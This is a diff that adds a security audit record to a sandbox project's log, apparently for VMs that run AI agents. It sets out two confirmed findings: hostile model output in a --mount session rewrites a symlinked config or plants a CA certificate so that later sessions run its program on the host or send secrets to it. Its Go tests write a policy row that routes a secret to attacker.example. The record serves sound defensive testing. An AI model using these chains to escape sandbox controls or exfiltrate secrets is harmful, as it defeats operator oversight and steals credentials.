@@ -8937,3 +8937,435 @@ next candidate number stays C85.
 After S-1012: sweep 3 stands as after S-F68, at two highs (C76 and C77, both fixed), fourteen mediums (C65, C66,
 C67, C68, C69, C71, C72, C73, C74, C75, C78, C80, C81 and C82, all fixed) and five lows (C64, C70, C79, C83 and C84,
 all fixed). Nothing waits under escape/_pending/. The next candidate number is C85 and the next fix unit S-F69.
+
+## S-1013, sweep 3: chains across surfaces, and the start-up, shutdown, crash and upgrade windows, as built at main cf37fd4
+
+Sweep 3 (S8), the last the SPEC allows, at the claim commit 1c7b97b (main cf37fd4 plus one log line), in a fresh
+context (S3): the product read as built after S-F1 to S-F68, not a diff. One auditor run, finished without a stop:
+no model declined, no safeguard stopped a turn and no tool permission was refused, in the auditor, the two redteam
+runs or the two verifiers. No hypervisor in the session and nothing was run on a VM: the candidates were probed by
+go test -overlay against the real packages, and the windows were run with the real cmd/workcell binary against a
+stand-in VMM (a script that records its pid and execs sleep), with dummy artifacts in a scratch data directory.
+Result: two candidates, C85 and C86, both medium, both chains of facts that single-surface audits had refuted or
+ruled low, each CONFIRMED by its own verifier; they are recorded below with their tests. Nothing was fixed (S1). The
+windows hold as sweep 2 recorded them, with the second order of S-F44 to S-F68 traced and, where it could be, run.
+The text below is the auditor's report, condensed by the orchestrator.
+
+Trust boundary. The chained surface has no entry point of its own. Its attacker bytes are those of the single
+surfaces: guest frames on vsock 5000, 5001 and 5002; the guest-written workspace.ext4 and rw cache images, attached
+and never parsed on the host; the repository tree and its workcell.toml; hostile model output as the agent's conduct
+inside a --mount session, where it writes every byte of every file beneath the export as the operator's uid through
+internal/fileserve (CREATE, WRITE, SYMLINK, RENAME, UNLINK); and the network attacker as the host resolver's answer
+for an allowed name (the model of the rebind rows, C7, C30, C53, C66, C69) and as the channel and artifact server
+with availability alone. What is new here is where those bytes meet host state that outlives one session, and the
+operator's own environment: the data directory (audit.key; sessions/<id> with audit.log, audit.seal, lock, repo,
+vmm, inodes and workspace.ext4; layers/<agent> with its markers; caches; channel.serial, channel.day, channel.next;
+updates.log), the VMM socket directory under TMPDIR, the user's config directory, and the operator's variables
+(TMPDIR, XDG_*, HOME, SSL_CERT_FILE, SSL_CERT_DIR). The authority that handles them is the supervisor at the
+operator's uid, before any VM exists and again per request: it reads the user's policy (loadPolicy through
+policy.Read, an os.Open that follows links), judges cwd against the data and config directories by spelling, inode
+and mount point (holds in cmd/workcell/data.go), judges secret sources and the [update] ca against cwd and the data
+directory, builds the proxy's upstream root pool once per session from the environment (upstreamRoots in
+internal/proxy/terminate.go), runs cmd: helpers on the host per secret use with cwd / (internal/secret/source.go),
+and holds the VM child under Pdeathsig. Since sweep 1 the product judges every operator-named path that it later
+trusts against the directory a session serves, by identity: cwd (named, C61), the data and config directories
+(holds: C19, C29, C52, C65), secret sources (C54, C58, C72, C75, C78, C80 to C82) and the ca (C59, C79, C84). Two
+operator-named trust inputs are not judged: the user's config.toml when it is a symbolic link to a file inside the
+served tree (holds compares the config directory's resolution, never the file's), and SSL_CERT_FILE and
+SSL_CERT_DIR, where upstreamRoots refuses a relative value only. Both are files that a --mount guest can rewrite and
+that every later session, anywhere, then reads as the operator's own.
+
+Parsing and resources. No new parser lies on this surface; every guest parser was traced to its bound and fuzzer in
+the single records. The pace of S-F47 and S-F60 sleeps only the file service's reader: a negative remainder returns
+at once, and Close takes life.Lock, which no worker holds across a send, so a sleeping reader never delays closeAll.
+A unix socket path over 108 bytes fails closed, seen again by a slip of the auditor's own: its first window script
+used the long scratch path as TMPDIR and every run exited 125 with a bind error, the VMM directory removed by
+closeAll and the session directory kept with session_end failed (PARKED line 14's clause, now with S-F67's shape).
+Helper processes of a cmd: source are bounded by the broker's 300 per minute window and the two-minute timeout (C16,
+low, unchanged). A mount guest learns of a new host file only through FUSE round trips of about 100 microseconds
+each, which bounds what it can do inside the microsecond windows of boot. Refuted: a guest that makes the reader
+sleep stalls only itself; the RemoveAll of closeAll and of rm follows no final symlink and opens the parent by path,
+so a link the guest plants under TMPDIR removes at most a directory of the guest's own name.
+
+Logic and state. The order of a start was traced from run() through session() and boot() in cmd/workcell/run_vm.go
+as built after S-F44 to S-F68: parseRun; loadPolicy with the C34, C54, C72, C75, C78, C80, C81 and C82 checks over
+every user row; loadArtifacts; startup (newInstaller with the ca prefix walk of S-F63 and S-F68, apply with its
+second verify against the floor, the daily goroutine); findLayers; openCaches; then session: Getwd, holds (data and
+config by within, mount points by /proc/self/mountinfo, running sessions' VMM directories by their vmm records), the
+--mount TMPDIR rule, named, newSession (LoadKey, MkdirAll, flock then pid, repo, audit.Create, session_start),
+Export(".") and the inodes write, or the mount; then boot: IsAbs(TMPDIR), the running-mount TMPDIR rule over every
+session's repo record, MkdirTemp, recordBoot, listeners 5000 and 5001, adapters, proxy, session CA and broker, the
+relay, 5002 and the file service under --mount, Start, accept. Every helper is up before Start, and the first
+connection to 5000 is the init's, because no guest code runs before Exec. Shutdown runs the defers in reverse:
+attach listener, terminal, the VM killed and reaped with its directory removed, session_end, lock; seen: stop ended
+a booting run in 54 ms with exit 143 recorded, SIGINT gave exit 130 and SIGTERM 143, both recorded. The marker
+transitions of apply, point, fail and update were walked again for a crash at each step, with no change since sweep
+2; S-F43 keeps fail from reading any marker when this start installed nothing. S-F67's kept directory behaves as its
+record says; seen: audit.log holds session_start and session_end failed, verify says intact, pull exits 1 and diff 2
+with one line naming rm, and rm takes the directory. What no code judges became the candidates: the resolved
+location of the config file, and the location of SSL_CERT_FILE and SSL_CERT_DIR.
+
+Concurrency, ordering and check-to-use. The lock is written only once held, stop reads the lock again before every
+rung, rm is refused while a run or a pull holds the lock (seen), two runs in one directory get two sessions and end
+on their own signals (seen), and a pull holds the lock for its life (seen: ls says running, rm and a second pull are
+refused, the lock file holds the pull's pid, two vmm lines). S-F46's second order against C63 holds end to end: a
+--mount start in a directory that holds the TMPDIR under which a pull booted is refused by holds with the pull's VMM
+directory named (seen, exit 125). Its twin with bench in place of the pull is admitted, since bench records nothing
+(seen; PARKED lines 137 and 144 stand). Pdeathsig: after SIGKILL of the supervisor the stand-in VMM was running at 1
+ms, a zombie with parent 1 at 50 ms and gone at 2 s, so the VM dies with the session (A9). The windows that remain
+are timed by the operator or by chance and stand as parked: C61's double swap (line 185), a mount start between
+another session's MkdirTemp and its recordBoot (line 188), the lock's truncate instant (line 187), two first uses of
+audit.key, two applies on one channel.next (line 45). One mechanism inside bench's window that no line names: Start
+writes firecracker.json with os.WriteFile, which follows a symlink that a mount guest could plant in the fresh
+directory, so the host would truncate a file of the guest's choosing and write the host-built JSON into it; the
+window from MkdirTemp to that write is 100 to 300 microseconds of host work, the directory name is random, and the
+guest learns of it and acts only through two FUSE round trips of the same order, so the auditor judged it unwinnable
+in practice: a note on line 137, in PARKED.md, not a candidate.
+
+Cryptography and identity. Nothing new is signed or verified on this surface. The identity primitive the fixes
+converged on, compare inodes and not spellings, is applied at the judge of cwd (named), of the data and config
+directories (within's SameFile walk), of mount points (mountinfo) and of the ca (EvalSymlinks per prefix), and is
+missing at two places where the product then trusts bytes for the rest of the session or for every later session:
+the user's config file is opened by its name through any link, and the proxy's upstream root pool is built once at
+Terminate from SSL_CERT_FILE and SSL_CERT_DIR with only the relative spelling refused, while x509.SystemCertPool
+reads both variables itself. A CA planted in such a file gives the network attacker as DNS what C30 and C53 gave it,
+and a planted policy gives the attacker the channel key the client trusts, so that I14's checks then guard the
+attacker's anchor.
+
+Failure modes. Every error path on this surface fails closed, by reading and by the runs: a failed bind exits 125
+with the VMM directory removed and the start recorded as failed; SIGKILL leaves no session_end and verify says
+incomplete; an export failure keeps the directory and records failed; running() returns every flock error but
+EWOULDBLOCK; a refused ca is one printed line and the run goes on with the zero installer, whose fail reads nothing
+(S-F43); a failed audit write fails every later record, session_end included, which verify then reports as
+incomplete. The two candidates are checks that no code performs, a fail-open by omission and not by error. Seen and
+noted, not a candidate: verify says intact for a session with no session_end while a pull holds its lock, the S-1010
+note of PARKED line 231; only the operator causes both the missing end (SIGKILL) and the pull.
+
+Downgrade, rollback and replay. apply removes channel.next first and verifies it again against the floor that the
+daily check wrote; the floor only rises; --rollback reads no manifest (line 184 stands); update --to goes through
+Select, so a withdrawn digest is refused; the residual of C2 (a forged first frame, or the operator's own ./claude,
+sets aside the layer that this start installed) is unchanged and accepted. With C85 the attacker rewrites the
+[update] channel and key, so the client's floor, expiry and signature checks all guard a manifest that the attacker
+signs; that is a consequence of C85 and not a weakness of the channel code. S-F63 and S-F68 open no new window: the
+ca walk runs before any transport, the refusal is printed and the session runs without a channel.
+
+Interaction between surfaces. Both candidates are chains. C85 is the promise of C19 and C65 (holds keeps the config
+directory out of every export) times a file-level symlink that holds never resolves, times C40 (a mount guest writes
+the whole real tree), times C54's judgement of a cmd: program against the next session's cwd alone, times the broker
+running helpers on the host per use. C86 is the S-1005 sweep 3 refutation (an absolute SSL_CERT_FILE inside the
+repository needs the operator's environment to name it, resting on C53's "no distinct finding") times C40 times
+C66's attacker model, against the precedent of the S-1009 and S-1011 verifiers, who accepted the same shape for the
+[update] ca (C79) and under the data directory (C84); the two surfaces disagreed, and the mount rewrite is the lever
+that neither considered. Also traced and refuted by reasoning: the S-1002 lead "sessions keyed by the spelling of
+cwd" does not reopen boot's running-mount TMPDIR check through nested mount sessions, because the outermost mount
+session's repo record is always true and its export holds everything a nested guest could rename. The S-1003 reverse
+layout, cwd bind-mounted inside sessions/<id>, needs the operator to mount a repository inside workcell's own
+sessions directory under a session-id name, which no layout gives (line 193 stands).
+
+Parked leads, each tried again (line numbers of PARKED.md as of main cf37fd4). Stand with no change: 14 (seen
+again), 17, 24, 34, 45, 47 (stop and rm measured again on the host side; the escape row is still missing), 69, 93,
+96, 123, 124, 131, 135, 136, 137 (seen by execution, with the one new note above), 139, 140, 143, 144, 145, 162,
+164, 167, 168, 169, 170, 171, 176, 178, 182 (the bench clause seen; the spelling clause found closed through
+nesting), 183, 184, 185, 186, 187 (seen: the lock holds the pull's pid after the pull), 188, 192, 193, 225 (its part
+(b), a ca in another session's mount export, is the ca twin of C86's shape and stays low for the ca, since I14 holds
+there), 231 (seen), 233 (seen), 234, 235, 236. Settled earlier and still so: 141. The lines on other surfaces'
+internals (proxy readings, token shapes, routes, fuzz notes, workflow notes) touch no chain or window and were not
+tried again here. No parked row names a config.toml link or an absolute SSL_CERT_FILE under cwd (lines 97, 148 and
+151 name SSL_CERT or config.toml for other readings), so both candidates differ from every recorded row.
+
+Coverage. Read in full: loop/SPEC.md; the fix-unit lines S-F47 to S-F68 of PLAN.md; in this file the sweep 2 record
+of this unit, every sweep 3 record and the C30 and C53 records; PARKED.md whole; every non-test file of cmd/workcell
+and of cmd/workcell-init; of internal: vmm (vmm.go, firecracker/firecracker.go, vz/vz.go and args.go), audit, wire,
+guest, workspace, fileserve, channel, artifact/verify.go, relay, resolver, policy, provider, secret, proxy (proxy,
+terminate, signin, allowlist, routes_linux), rootfs (ext4file, tree, layer) and pins/pins.go; for fixtures the tests
+c19, c54 and c79 of cmd/workcell, c30 of internal/proxy and the fixture parts of terminate_test.go. Grepped:
+release.yml for CGO_ENABLED (the Linux binaries are static, so the pure Go resolver runs and HOSTALIASES cannot
+steer a lookup). Not opened: internal/rootfs ext4.go, build.go and oci.go; internal/sigstore, bump, advisory and
+version; cmd/bump and cmd/mkimage; proxy/routes_other.go; escape/; docs/; the rest of .github; the other tests;
+_legacy/. Ran, all from a scratch directory with the repository unchanged: five probes by go test -overlay (two in
+internal/proxy, three in cmd/workcell), each against loopback listeners or files that the probe made; and seven
+window tests driving the built binary through a stand-in VMM: start, ls, rm, verify and attach while running, and
+stop; SIGKILL during boot, then verify, stop, attach, pull and rm; an export failure (a relative path of 4507 bytes)
+and the kept record; a killed clone session pulled, with ls, verify, rm, a second pull and a --mount run during the
+pull; two runs at once ended by SIGINT and SIGTERM; the Pdeathsig timing; a --mount start over a pull's and over
+bench's TMPDIR. No VM, no escape row, no macOS path, no fuzzing, no pull end to end with a real guest; the guest's
+writes of both candidates were modelled by host writes, as the tests of C54, C79 and C84 do. S12: no third-party
+host was contacted and no probe traffic left the session; the Go toolchain and golang.org/x/sys came from the module
+proxy by the project's own build, as in every gate run. S14: nothing private. data.go, policy.go, run_vm.go and
+update.go are v2's own; terminate.go is ported, so C86 carries its v1 line; neither candidate is a weakness in Go,
+in a provider or in anyone else's project.
+
+### S-1013 candidates, sweep 3
+
+C85. ID I13 (workspace content can only narrow policy: the guest's write beneath its export becomes the user's
+config), with I5 (the attacker's [[secret]] rows bind any host file the operator can read to a host of its choosing,
+and a cmd: row runs a program of its choosing on the host) and I14 by consequence (the [update] channel and key that
+the client trusts become the attacker's). The promise broken is that of holds() itself: a session may not see the
+config directory. ATTACKER: guest root in a --mount session, by hostile model output or a malicious repository's
+hook, whose export holds the target of the operator's config.toml symbolic link; then the operator's next ordinary
+session, anywhere, whose honest agent makes one request to its API host. SEVERITY: medium (S6: an invariant broken,
+with one precondition the attacker does not control: the operator's config.toml under $XDG_CONFIG_HOME/workcell is a
+symbolic link to a file in the mounted tree, the layout of a dotfiles repository managed by ln -s or by stow without
+directory folding); the grade of C19, C52 and C65 for an operator layout. WHERE: cmd/workcell/data.go, where holds
+compares the resolved config directory with cwd and never the file's resolution; cmd/workcell/policy.go, where
+configFile names the file, policy.Read follows the link, and the cmd: judgement of C54 is against the current cwd
+only; internal/secret/broker.go and source.go, where the broker runs the program on the host from /. INPUT:
+$XDG_CONFIG_HOME/workcell/config.toml is a link to <W>/dotfiles/config.toml, a regular file. Terminal 1: `cd <W> &&
+workcell run --mount -- claude`. The guest writes /workspace/evil.sh and rewrites /workspace/dotfiles/config.toml to
+allow a host and to hold a [[secret]] row with source cmd:<W>/evil.sh (and, if it likes, a file: row naming a
+private key bound to a host it owns, and an [update] channel and key of its own). Terminal 2, later, in any other
+directory: `workcell run -- claude`. EFFECT: terminal 1 is admitted; in terminal 2 loadPolicy reads the rewritten
+file, C54's check passes because the program lies outside that cwd, a binding is minted, and at the agent's first
+request the broker runs <W>/evil.sh on the host as the operator. By contrast the same layout with the config
+directory linked is refused (c19_test.go, the link arm).
+
+Reproducing test, by the redteam from the claim alone: TestC85ConfigFileLinkedIntoTheWorkspace, package main of
+cmd/workcell, 45 lines, its source below. Two arms share one body: config.toml linked to a file under the working
+directory, and the control, linked to a file outside it. Each loads the policy and calls session with --mount on
+c19Data's dummy artifacts; admitted means a session directory beside the earlier one. When the attacking arm is
+admitted the test writes the program and the new policy by a host write to the link's target, in place of the
+guest's write through /workspace, changes to another directory, loads the policy again and resolves the row's source
+by secret.Resolve, the broker's own call. Run by the orchestrator by overlay, plain and under -race, logs saved: the
+attacking arm fails with "the --mount session in <W> was admitted with <cfg>/workcell/config.toml a link to
+<W>/dotfiles/config.toml, inside it; the policy the guest then wrote there is the user's policy of a session in
+another directory (<nil>): secret {Name:stolen Source:cmd:<W>/tools/get-key.sh Host:attacker.example
+Header:x-api-key}, and the host ran its program: value "C85-TOKEN", <nil>, ran on the host: true", and the control
+arm passes. It passes once loadPolicy or session refuses, with no session directory made, in an error that names the
+config file or the link's target.
+
+Outcome: CONFIRMED at medium by the verifier, who repeated both runs. On the power the test takes: --mount serves
+cwd live and the file service accepts a create and a write on a regular file, so the guest holds the link's target;
+the test takes only the operator's own steps, the link and a mount session in the dotfiles tree. On the word
+admitted: past holds and named into newSession, the dummy VMM failing at boot, as in the C19 and C54 tests; with a
+real VMM the session boots and serves the file. The chain is real: the broker's Lookup calls Resolve per use and run
+executes the program from / as the operator, and the marker file shows it; the later loadPolicy runs in another cwd,
+so C54's check cannot fire. Not intended behaviour: holds and the link arm of c19_test.go show that the product
+means to refuse this placement, and the file-level link slips past the directory-level resolve. Not high: the
+ordinary layout, a real file under the config directory, is unaffected. Not low: the break is demonstrated. The
+verifier's strongest argument against its own ruling: the operator chose both the link and the labelled --mount
+(A5), and PARKED line 17 accepts that mount-mode writes land in the user's tree by design; rejected because the rule
+already refuses the config directory in the same position, and the effect outlives the session and reaches every
+later session in any directory, which the label does not say. Reasoned by the auditor and the verifier and not
+shown: clone mode and the operator's own `workcell pull` into the tree land the same bytes without --mount. Not
+recorded before: no row of PARKED.md or of the C19, C54 and C65 records names a config.toml link. Not S14: data.go,
+policy.go and internal/policy are v2's own, nothing ported, no v1 line. Fix unit: S-F69, below S-1013 in PLAN.md.
+The test is not parked under escape/_pending/: the test budget has no line of room and escape/ no layout left, so,
+as C27's record did, this record holds it and the fix unit re-creates it; the source below is the file byte for
+byte, each line behind four spaces.
+
+Source of cmd/workcell/c85_test.go (45 lines):
+
+    // SPDX-License-Identifier: Apache-2.0
+    // Copyright 2026 Omkhar Arasaratnam
+    //go:build linux || (darwin && arm64 && cgo)
+    
+    // Finding C85 of S-1013, sweep 3 (I13; I5 and I14 by consequence): the user's config.toml is a symbolic link to a file under the directory a --mount session runs in.
+    package main
+    
+    import (
+    	"cmp"
+    	"os"
+    	"path/filepath"
+    	"strings"
+    	"testing"
+    
+    	"github.com/omkhar/workcell/v2/internal/secret"
+    )
+    
+    // TestC85ConfigFileLinkedIntoTheWorkspace (I13; I5, I14 by consequence): holds() refuses a workspace that holds the config directory (C19), but not one that holds the target of a config.toml symbolic link (a dotfiles repository), so `workcell run --mount` there is admitted, and guest root rewrites the operator's policy through /workspace: every later session in any directory reads its allow hosts, its [[secret]] rows (a cmd: program it left in the workspace, which the broker runs on the host at the first matching request; the C54 check judges only that session's own cwd) and its [update] table. No hypervisor runs here: the guest's write is modelled by a host write to the link's target, as C54 and C84 model theirs. The session must be refused before a session directory, key or export exists, in an error naming the config file; the same layout with the target outside the workspace (the control arm) must still run.
+    func TestC85ConfigFileLinkedIntoTheWorkspace(t *testing.T) {
+    	for _, arm := range []string{"config.toml linked to a file under the --mount workspace", "control: linked to a file outside it"} {
+    		t.Run(arm, func(t *testing.T) {
+    			work, cfg, data, under := must(filepath.EvalSymlinks(t.TempDir())), t.TempDir(), filepath.Join(t.TempDir(), "workcell"), !strings.HasPrefix(arm, "control") // macOS: /var is /private/var
+    			t.Setenv("XDG_CONFIG_HOME", cfg)
+    			t.Setenv("XDG_DATA_HOME", filepath.Dir(data))
+    			target, program, marker := filepath.Join(cmp.Or(map[bool]string{true: work}[under], cfg), "dotfiles", "config.toml"), filepath.Join(work, "tools", "get-key.sh"), filepath.Join(t.TempDir(), "C85-RAN-ON-THE-HOST")
+    			must(0, cmp.Or(os.MkdirAll(filepath.Join(cfg, "workcell"), 0o700), os.MkdirAll(filepath.Dir(target), 0o700), os.MkdirAll(filepath.Dir(program), 0o700), os.WriteFile(target, []byte("[network]\nallow = [\"api.anthropic.com\"]\n"), 0o600), os.Symlink(target, filepath.Join(cfg, "workcell", "config.toml"))))
+    			a := c19Data(t, data, "/elsewhere")
+    			t.Chdir(work)
+    			allow, secrets, _, file, err := loadPolicy(nil, os.Stderr)
+    			if err == nil {
+    				err = session([]string{"true"}, limits{DiskMiB: 16}, true, a, allow, secrets).err
+    			}
+    			if admitted := len(must(os.ReadDir(filepath.Join(data, "sessions")))) > 1; !under && !admitted { // admitted: a session directory beyond the earlier one c19Data made; the dummy VMM then fails it at boot
+    				t.Fatalf("control: the session with %s a link to %s, outside the workspace, was refused: %v", file, target, err)
+    			} else if !under || err != nil && !admitted && (strings.Contains(err.Error(), file) || strings.Contains(err.Error(), target)) {
+    				return // refused before a session directory exists, naming the config file: the invariant holds
+    			}
+    			must(0, cmp.Or(os.WriteFile(program, []byte("#!/bin/sh\necho ran > "+marker+"\necho C85-TOKEN\n"), 0o700), os.WriteFile(target, []byte("[network]\nallow = [\"attacker.example\"]\n\n[[secret]]\nname = \"stolen\"\nsource = \"cmd:"+program+"\"\nhost = \"attacker.example\"\nheader = \"x-api-key\"\n"), 0o600)))
+    			t.Chdir(t.TempDir())                                                                 // above, the guest's write through /workspace, modelled on the host: the operator's policy is now the guest's, and so is the program the host runs; here, the operator's next session, in any directory
+    			allow, secrets, _, _, err = loadPolicy(nil, os.Stderr)                               // a row is accepted only with its host in the allow list, so an accepted row shows both
+    			v, runErr := secret.Resolve(t.Context(), append(secrets, binding{})[0].grant.Source) // what the broker runs at the first request on that host
+    			t.Errorf("I13: the --mount session in %s was admitted with %s a link to %s, inside it; the policy the guest then wrote there is the user's policy of a session in another directory (%v): secret %+v, and the host ran its program: value %q, %v, ran on the host: %t", work, file, target, err, append(secrets, binding{})[0].grant, v, runErr, exists(marker))
+    		})
+    	}
+    }
+
+C86. ID I6 (on a terminated connection the upstream certificate matches an allowed name, under the host's trust) and
+through it I5 (the real secret goes only into a verified connection); the class and grade of C30 and C53, in the
+absolute spelling that those fixes left. ATTACKER: guest root in a --mount session, by hostile model output or a
+repository hook, whose export holds the file that SSL_CERT_FILE names or the directory that an SSL_CERT_DIR entry
+names, completed by the network attacker as the host resolver's answer for an allowed name (the rebind model of C7,
+C30, C53, C66 and C69), against every later session of the operator. Also, with no mount: a malicious repository
+that ships the file at that path, when the operator runs a clone session there. SEVERITY: medium (S6: a demonstrated
+break with one precondition the attacker does not control: the operator's SSL_CERT_FILE or SSL_CERT_DIR names an
+absolute path inside a directory in which they run a session, such as a corporate bundle kept in a dotfiles or certs
+tree). WHERE: internal/proxy/terminate.go, where upstreamRoots refuses a relative certFile and a relative
+SSL_CERT_DIR entry, then calls x509.SystemCertPool, which reads both variables itself, and reads certFile, called
+from Terminate for every session that terminates a name; cmd/workcell/run_vm.go, where boot calls bind, which calls
+Terminate, before Start, and session judges cwd against the data, config and temp directories and by identity, never
+against the environment's trust files. also in v1 main: egressproxy/terminate.go (the file is ported; the missing
+judgement could as well live in cmd/workcell, which is v2's own). INPUT: SSL_CERT_FILE=<W>/certs/corp-ca.pem, or
+SSL_CERT_DIR naming <W>/certs, in the operator's environment. Terminal 1: `cd <W> && workcell run --mount --
+claude`; the guest writes its own CA's PEM into /workspace/certs/corp-ca.pem, or adds a file to /workspace/certs.
+Terminal 2, later, anywhere, with a [[secret]] row bound to an allowed host: `workcell run -- claude`; the resolver
+answers that host with the attacker's address, whose server presents a leaf for the name signed by the planted CA.
+EFFECT: terminal 1 is admitted; in terminal 2 Terminate builds the pool from the planted file, the leaf verifies,
+and the proxy puts the real secret into the request that it sends to the attacker; where the relative spellings are
+refused (c30_test.go, c53_test.go) and the same path as [update] ca is refused by newInstaller.
+
+Reproducing test, by the redteam from the claim alone: TestC86SSLCertPathUnderTheWorkingDirectory, package main of
+cmd/workcell, 50 lines, its source below. Four arms share one body: a clone session with SSL_CERT_FILE under cwd, a
+mount session with the same, a clone session with an SSL_CERT_DIR entry under cwd, and the control, SSL_CERT_FILE
+under a directory outside cwd and the data directory. Each writes the certificate of an authority that the test
+made, loads a policy that allows one host and calls session on c19Data's dummy artifacts; it wants the session
+refused before newSession, with no session directory beside the earlier one, in an error that names the variable,
+and the control admitted. The admission loads no system pool, so the SSL_CERT_DIR arm runs in the same process. A
+second file is evidence and not the test that a fix turns green: TestC86AbsoluteSSLCertPathUnderTheWorkingDirectory,
+package proxy, 44 lines, its source below too; it runs itself again once per variable (C53's pattern, since Go loads
+the system pool once per process), writes certs/ca.pem under cwd, calls the real Terminate and sends one request
+through the package's own testProxy to a loopback upstream that holds a leaf of that CA. Run by the orchestrator by
+overlay, plain and under -race, four logs saved: the three attacking arms fail with "session gave start firecracker:
+invalid argument, a session directory made: true; want refused before newSession in an error naming SSL_CERT_FILE:
+true" (SSL_CERT_DIR in the third), the control arm passes, and the probe fails in both children with "the attacker's
+upstream, holding a leaf of the repository's CA, answered (200, "real-secret"): the real secret left".
+
+Outcome: CONFIRMED at medium by the verifier, who repeated the four runs. The effect claimed is shown across the two
+packages, the admission in cmd/workcell and the secret leaving at Terminate in internal/proxy, with no product code
+bypassed: session admits on holds, the TMPDIR rule and named only, then boot, bind and Terminate; upstreamRoots
+refuses only a value that does not start with a slash. The guest's power is real: the file service serves the
+--mount export read-write (mkdir, create, open for writing with truncation, write), so a guest creates certs/ca.pem
+or appends its CA to a bundle, and the fixtures (testProxy, fakeBroker, the lookup and dial seams standing for the
+DNS position) are those that C30 and C53 were confirmed with. The one link not run, the guest's write through the
+file service in a real VM, needs no VM to be believed. The clone variant with no mount is weaker, since the operator
+would have to check a hostile repository out onto their own bundle's path; the --mount variant alone carries the
+finding. Not higher: it needs the operator's environment. Not lower: unlike C79 and C84, where I14's key, serial,
+expiry and digest still gated, here I6 and I5 are shown broken. The verifier's strongest argument against its own
+ruling: SSL_CERT_FILE and SSL_CERT_DIR are the process's trust store, which every Go program honours, and an
+operator who points them into a tree and then runs an agent with --mount in that very tree has handed over the root
+by their own act, a narrower precondition than C30's and C53's; kept because the product already refuses every other
+host-trusted path under cwd (C30, C53, C79, C84), C79's verifier accepted this precondition class as a finding, and
+the control arm shows that a fix need not refuse a bundle kept elsewhere. Recorded before, but never as a finding
+and never with a test: C53's record ("an absolute SSL_CERT_DIR entry that is the repository's own path ... no
+distinct finding") and the S-1005 sweep 3 note that an absolute SSL_CERT_FILE inside the repository needs the
+operator's own environment to name it; this record corrects both. No row of PARKED.md holds it. Not S14:
+terminate.go is ported from v1 and no v1 release holds it (SPEC section 13), run_vm.go is v2's own, and the reading
+of the variables is Go's documented behaviour, not a weakness in Go. also in v1 main: egressproxy/terminate.go. Fix
+unit: S-F70, below S-1013 in PLAN.md. As for C85, nothing is parked under escape/_pending/: this record holds the
+test, byte for byte behind four spaces, and the fix unit re-creates it; the probe is evidence, and the fix unit need
+not keep it.
+
+Source of cmd/workcell/c86_test.go (50 lines):
+
+    // SPDX-License-Identifier: Apache-2.0
+    // Copyright 2026 Omkhar Arasaratnam
+    
+    // Finding C86 of S-1013, sweep 3 (I6, through it I5): SSL_CERT_FILE, or an entry of SSL_CERT_DIR, names by an absolute path a file under the directory the session runs in. The absolute sibling of C30 and C53.
+    
+    //go:build linux || (darwin && arm64 && cgo)
+    
+    package main
+    
+    import (
+    	"cmp"
+    	"io"
+    	"os"
+    	"path/filepath"
+    	"strings"
+    	"testing"
+    	"time"
+    
+    	"github.com/omkhar/workcell/v2/internal/proxy"
+    )
+    
+    // TestC86SSLCertPathUnderTheWorkingDirectory (I6, I5): upstreamRoots refuses a relative SSL_CERT_FILE or SSL_CERT_DIR entry (C30, C53) but takes an absolute one wherever it lies, so SSL_CERT_FILE=<cwd>/certs/ca.pem makes a file of the repository a root of the proxy's upstream pool: a malicious repository ships it, or guest root under --mount writes it for every later session of the operator (modelled by a host write, as C54 does: no hypervisor here), and a leaf of that CA, from the network attacker as the host resolver's answer for an allowed name, verifies and is sent the real secret (the probe internal/proxy/c86_probe_test.go shows it leaving). The session must be refused before newSession in an error naming the variable, as an [update] ca under cwd is (C79); the same file under a directory outside cwd and the data directory (the control arm) is still accepted. The VMM is a dummy: an admitted session fails at boot, after its directory exists. The admission needs no load of the system pool, so the SSL_CERT_DIR arm runs in this process. Precondition the attacker does not control: the operator's environment names a path under the repository.
+    func TestC86SSLCertPathUnderTheWorkingDirectory(t *testing.T) {
+    	for _, tc := range []struct {
+    		name, env    string
+    		mount, under bool
+    	}{{"clone, SSL_CERT_FILE under cwd", "SSL_CERT_FILE", false, true}, {"mount, SSL_CERT_FILE under cwd", "SSL_CERT_FILE", true, true}, {"clone, an SSL_CERT_DIR entry under cwd", "SSL_CERT_DIR", false, true}, {"control: SSL_CERT_FILE outside cwd and the data directory", "SSL_CERT_FILE", false, false}} {
+    		t.Run(tc.name, func(t *testing.T) {
+    			work, data, config := must(filepath.EvalSymlinks(t.TempDir())), filepath.Join(t.TempDir(), "workcell"), filepath.Join(t.TempDir(), "workcell") // macOS: /var is /private/var
+    			file := cmp.Or(map[bool]string{true: filepath.Join(work, "certs", "ca.pem")}[tc.under], filepath.Join(t.TempDir(), "corp", "roots.pem"))       // the attacker's file in the repository, or the operator's own authority elsewhere (the control arm)
+    			t.Setenv("XDG_DATA_HOME", filepath.Dir(data))
+    			t.Setenv("XDG_CONFIG_HOME", filepath.Dir(config))
+    			t.Setenv("TMPDIR", t.TempDir()) // --mount refuses a cwd under the temp directory
+    			t.Setenv(tc.env, cmp.Or(map[string]string{"SSL_CERT_DIR": "/etc/ssl/certs:" + filepath.Dir(file)}[tc.env], file))
+    			ca := must(proxy.NewSessionCA([]string{"api.example.com"}, time.Now().Add(time.Hour))) // the attacker's authority; it keeps the key
+    			must(0, cmp.Or(os.MkdirAll(filepath.Dir(file), 0o700), os.MkdirAll(config, 0o700), os.WriteFile(file, ca.CertPEM(), 0o600), os.WriteFile(filepath.Join(config, "config.toml"), []byte("[network]\nallow = [\"api.example.com\"]\n"), 0o600)))
+    			a := c19Data(t, data, "/elsewhere")
+    			t.Chdir(work)
+    			allow, secrets, _, _, err := loadPolicy(nil, io.Discard)
+    			if err == nil {
+    				err = session([]string{"true"}, limits{DiskMiB: 16}, tc.mount, a, allow, secrets).err
+    			}
+    			ents, _ := os.ReadDir(filepath.Join(data, "sessions"))
+    			started, refused := len(ents) > 1, err != nil && strings.Contains(err.Error(), tc.env) // started: a session directory beside the earlier session's, so newSession ran
+    			if started == tc.under || refused != tc.under {
+    				t.Errorf("I6: %s=%q, under cwd %t, --mount %t: session gave %v, a session directory made: %t; want refused before newSession in an error naming %s: %t", tc.env, os.Getenv(tc.env), tc.under, tc.mount, err, started, tc.env, tc.under)
+    			}
+    		})
+    	}
+    }
+
+Source of the evidence probe, internal/proxy/c86_probe_test.go (44 lines):
+
+    // SPDX-License-Identifier: Apache-2.0
+    // Copyright 2026 Omkhar Arasaratnam
+    
